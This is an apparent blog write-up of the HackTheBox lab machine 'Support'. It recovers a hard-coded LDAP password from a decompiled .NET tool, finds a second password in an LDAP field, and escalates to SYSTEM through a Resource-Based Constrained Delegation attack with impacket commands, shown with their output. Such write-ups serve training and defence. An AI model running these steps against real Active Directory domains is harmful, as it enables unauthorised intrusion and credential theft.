---
layout: post
title: "HTB Support Writeup"
date: 2025-09-30 11:15:28 -0400
categories: hackthebox HTB-easy
tags: hacking CTF HTB windows active-directory SMB reversing .NET bloodhound RBCD HTB-easy
---
## Introduction
This is an easy Windows machine on [HackTheBox](https://app.hackthebox.com/machines/Support){:target="_blank"}{:rel="noopener noreferrer"}. Given the IP of a machine we want to gain a shell with full administrator access

![htb-support-pwn](images/HTB-support/htb-support-pwn.png)
## Enumeration
### Port Scan
Let's find out what services are accessible 
```bash
┌──(kali@kali)-[~/support.htb]
└─$ rustscan -a 10.10.11.174 -- -A -sCV
[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.11.174:53
Open 10.10.11.174:88
Open 10.10.11.174:135
Open 10.10.11.174:139
Open 10.10.11.174:389
Open 10.10.11.174:445
Open 10.10.11.174:464
Open 10.10.11.174:593
Open 10.10.11.174:3268
Open 10.10.11.174:3269
Open 10.10.11.174:5985
Open 10.10.11.174:9389
Open 10.10.11.174:49664
Open 10.10.11.174:49667
Open 10.10.11.174:49676
Open 10.10.11.174:49688
Open 10.10.11.174:49693
Open 10.10.11.174:49716
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -A -sC" on ip 10.10.11.174
# ...
Scanned at 2025-09-29 11:40:09 EDT for 99s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-09-29 15:40:17Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49676/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49688/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49693/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49716/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=9/29%OT=53%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=68DAA8BC%P=x86_64-pc-linux-gnu)
SEQ(SP=102%GCD=1%ISR=108%TI=I%II=I%SS=S%TS=A)
SEQ(SP=108%GCD=1%ISR=10B%TI=I%II=I%SS=S%TS=A)
OPS(O1=M552NW8ST11%O2=M552NW8ST11%O3=M552NW8NNT11%O4=M552NW8ST11%O5=M552NW8ST11%O6=M552ST11)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M552NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Uptime guess: 0.007 days (since Mon Sep 29 11:31:44 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-09-29T15:41:10
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 19493/tcp): CLEAN (Timeout)
|   Check 2 (port 35040/tcp): CLEAN (Timeout)
|   Check 3 (port 45724/udp): CLEAN (Timeout)
|   Check 4 (port 29416/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

TRACEROUTE (using port 139/tcp)
HOP RTT      ADDRESS
1   25.95 ms 10.10.14.1
2   26.03 ms 10.10.11.174

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:41
Completed NSE at 11:41, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:41
Completed NSE at 11:41, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:41
Completed NSE at 11:41, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.65 seconds
           Raw packets sent: 106 (8.348KB) | Rcvd: 52 (3.016KB)
```


An active directory machine! Add the domain to our `/etc/hosts` file
```bash
<MACHINE_IP> support.htb dc.support.htb
```

### SMB (139, 445)
Using `smbclient` we can list the server shares
```bash
┌──(kali@kali)-[~/support.htb]
└─$ smbclient -L //support.htb  
Password for [WORKGROUP\kali]:

  Sharename       Type      Comment
  ---------       ----      -------
  ADMIN$          Disk      Remote Admin
  C$              Disk      Default share
  IPC$            IPC       Remote IPC
  NETLOGON        Disk      Logon server share 
  support-tools   Disk      support staff tools
  SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to support.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

We can connect to the `support-tools` share **without credentials**
```bash
┌──(kali@kali)-[~/support.htb]
└─$ smbclient //support.htb/support-tools
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jul 20 13:01:06 2022
  ..                                  D        0  Sat May 28 07:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 07:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 07:19:55 2022
  putty.exe                           A  1273576  Sat May 28 07:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 07:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 13:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 07:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 07:19:43 2022

    4026367 blocks of size 4096. 970481 blocks available
smb: \> get UserInfo.exe.zip 
getting file \UserInfo.exe.zip of size 277499 as UserInfo.exe.zip (1411.4 KiloBytes/sec) (average 1411.4 KiloBytes/sec)
```

Grabbing and unzipping the (non standard) `UserInfo.exe.zip` file
```bash
┌──(kali@kali)-[~/support.htb]
└─$ mkdir userinfo

┌──(kali@kali)-[~/support.htb]
└─$ unzip UserInfo.exe.zip -d userinfo 
Archive:  UserInfo.exe.zip
  inflating: userinfo/UserInfo.exe   
  inflating: userinfo/CommandLineParser.dll  
  inflating: userinfo/Microsoft.Bcl.AsyncInterfaces.dll  
  inflating: userinfo/Microsoft.Extensions.DependencyInjection.Abstractions.dll  
  inflating: userinfo/Microsoft.Extensions.DependencyInjection.dll  
  inflating: userinfo/Microsoft.Extensions.Logging.Abstractions.dll  
  inflating: userinfo/System.Buffers.dll  
  inflating: userinfo/System.Memory.dll  
  inflating: userinfo/System.Numerics.Vectors.dll  
  inflating: userinfo/System.Runtime.CompilerServices.Unsafe.dll  
  inflating: userinfo/System.Threading.Tasks.Extensions.dll  
  inflating: userinfo/UserInfo.exe.config  
```

The `UserInfo.exe` binary is a 32 bit `.NET` portable executable
```bash
┌──(kali@kali)-[~/support.htb/userinfo]
└─$ file UserInfo.exe
UserInfo.exe: PE32 executable for MS Windows 6.00 (console), Intel i386 Mono/.Net assembly, 3 sections
```

Rather than using `ghidra` we can use a more specialized tool for decompiling `.NET`, [ILSpy](https://github.com/icsharpcode/ILSpy){:target="_blank"}{:rel="noopener noreferrer"}! 

## user.txt
### Decompile
After downloading the `VSCode` extension we can decompile the binary to get the `C#` code. 

The username `ldap` can be found in `UserInfo` -> `UserInfo.Services` -> `LdapQuery()`
```c#
public LdapQuery()
{
    string password = Protected.getPassword();
    entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
    entry.AuthenticationType = AuthenticationTypes.Secure;
    ds = new DirectorySearcher(entry);
}
```

Under `UserInfo` -> `UserInfo.Services` -> `Protected` we find an **encrypted password**
```c#
using System;
using System.Text;
namespace UserInfo.Services;
internal class Protected
{
    private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
    private static byte[] key = Encoding.ASCII.GetBytes("armando");
    public static string getPassword()
    {
      byte[] array = Convert.FromBase64String(enc_password);
      byte[] array2 = array;
        for (int i = 0; i < array.Length; i++)
        {
          array2[i] = (byte)(array[i] ^ key[i % key.Length] ^ 0xDF);
        }
          return Encoding.Default.GetString(array2);
    }
}
```

To retrieve the password we'll need to decode from `base64`, then repeatedly `XOR` each decoded byte with a character in the string `armando` and the value `0xDF`. We can do this with a quick `python` script
```python
enc_password = '0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E'

# decode from base64
import base64
enc_password = base64.b64decode(enc_password)

# XOR each byte with key and 0xDF
dec_password = []
key = b'armando'
for i, c in enumerate(enc_password):
    dec_password.append(chr(c ^ key[i % len(key)] ^ 0xDF ))

print(f'decrypted password: {"".join(dec_password)}')
```

```bash
┌──(kali@kali)-[~/support.htb]
└─$ python3 decrypt.py                                             
decrypted password: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

### Bloodhound
To fix any `clock skew` errors I added this to my `~/.zshrc`
```bash
alias sync-ad="faketime \"\$(ntpdate -q support.htb | cut -d ' ' -f 1,2)\" ""
```

Now that we have credentials we can map out active directory relationships with `bloodhound`
```bash
┌──(kali@kali)-[~/sync/server]
└─$ sync-ad bloodhound-python -u 'support' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -dc dc.support.htb -d support.htb -ns 10.10.11.174 -c all --zip
```

Let's run `bloodhound` and upload our `zip` file
```bash
┌──(kali@kali)-[~/sync/server]
└─$ sudo -b neo4j console && bloodhound
```

Through the `Shortest Path to Domain Admins` query the `support` user is needed to establish a `powershell` session on the server

![htb-support-bloodhound](images/HTB-support/htb-support-bloodhound.png)

### LDAP
We can grab detailed information for the `support` user using `ldapsearch`
```bash
┌──(kali@kali)-[~/support.htb]
└─$ ldapsearch -x -H ldap://support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "CN=SUPPORT,CN=USERS,DC=SUPPORT,DC=HTB"
# extended LDIF
#
# LDAPv3
# base <CN=SUPPORT,CN=USERS,DC=SUPPORT,DC=HTB> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# support, Users, support.htb
dn: CN=support,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: support
c: US
l: Chapel Hill
st: NC
postalCode: 27514
distinguishedName: CN=support,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111200.0Z
whenChanged: 20220528111201.0Z
uSNCreated: 12617
info: Ironside47pleasure40Watchful
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
uSNChanged: 12630
company: support
streetAddress: Skipper Bowles Dr
name: support
objectGUID:: CqM5MfoxMEWepIBTs5an8Q==
userAccountControl: 66048
badPwdCount: 2
codePage: 0
countryCode: 0
badPasswordTime: 134036453089233475
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982099209777070
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILUQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: support
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111201.0Z
dSCorePropagationData: 16010101000000.0Z

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

The `info` tag has suspicious data that looks like a password. Let's **reuse** these credentials and grab the `user.txt` flag
```bash
┌──(kali@kali)-[~/support.htb]
└─$ sync-ad evil-winrm -u 'support' -p 'Ironside47pleasure40Watchful' -i support.htb     

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\support\Documents> cd ..
*Evil-WinRM* PS C:\Users\support> cd Desktop
*Evil-WinRM* PS C:\Users\support> cat user.txt
```

![htb-support-user-txt](images/HTB-support/htb-support-user-txt.png)
## root.txt
Going back to `bloodhound` we can check the `Outbound Object Controls` of the `support` user
![htb-support-genericall](images/HTB-support/htb-support-genericall.png)

### Resource Based Constrained Delegation
Since our group has the `GenericAll` privilege over the computer, we can perform a [Resource Based Constrained Delegation](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/resource-based-constrained-delegation.html#linux-tooling-end-to-end-rbcd-with-impacket-2024){:target="_blank"}{:rel="noopener noreferrer"} attack to impersonate **any user** on the machine

First we'll create a new (fake) computer
```bash
┌──(kali@kali)-[~/support.htb]
└─$ impacket-addcomputer -computer-name 'FAKE$' -computer-pass 'Dasian123!' -dc-ip 10.10.11.174 'support.htb/support:Ironside47pleasure40Watchful' 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Successfully added machine account FAKE$ with password Dasian123!.
```

Grant RBCD on the vulnerable computer to our fake machine 
```bash
┌──(kali@kali)-[~/support.htb]
└─$ impacket-rbcd -delegate-to 'DC$' -delegate-from 'FAKE$' -dc-ip 10.10.11.174 -action write 'support.htb/support:Ironside47pleasure40Watchful'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] FAKE$ can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     FAKE$        (S-1-5-21-1677581083-3380853377-188903654-5603)
```

Request a service ticket for the user we want to impersonate
```bash
┌──(kali@kali)-[~/support.htb]
└─$ impacket-getST -spn cifs/dc.support.htb -impersonate Administrator -dc-ip 10.10.11.174 'support.htb/FAKE$:Dasian123!'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```

Set it in the environment and we can login as `Administrator`!
```bash
┌──(kali@kali)-[~/support.htb]
└─$ export KRB5CCNAME=$(pwd)/Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache 

┌──(kali@kali)-[~/support.htb]
└─$ psexec.py support.htb/administrator@dc.support.htb -k -no-pass
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on dc.support.htb.....
[*] Found writable share ADMIN$
[*] Uploading file YEqzJQNs.exe
[*] Opening SVCManager on dc.support.htb.....
[*] Creating service ioDR on dc.support.htb.....
[*] Starting service ioDR.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.859]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
```

![htb-support-root-txt](images/HTB-support/htb-support-root-txt.png)
## Recap
With blank credentials we're able to read the `support-tools` `SMB` share. By decompiling the `UserInfo.exe` binary with `ILSpy` we can **extract credentials** for the `ldap` user. Using these creds to gather `LDAP` information, we can find the password for the `support` user. Logging in as `support` we can grab the `user.txt` flag!

The `support` user has the `GenericAll` privilege over the **domain controller machine**. Through `Resource Based Constrained Delegation`, we can create a fake machine and **impersonate other users** through it. By generating a service ticket for the `Administrator` user we can create an elevated shell to grab the `root.txt` flag!

